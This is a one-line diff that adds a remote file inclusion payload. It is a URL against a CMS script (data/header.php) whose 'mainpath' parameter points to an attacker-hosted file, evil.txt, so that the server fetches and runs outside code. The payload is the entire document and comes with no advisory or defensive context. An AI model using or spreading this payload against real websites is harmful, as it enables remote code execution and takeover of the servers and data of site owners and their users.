@@ -1,0 +1,1 @@
+http://www.example.com/[cms_faethon_path]/data/header.php?mainpath=http://www.example.com/evil.txt?
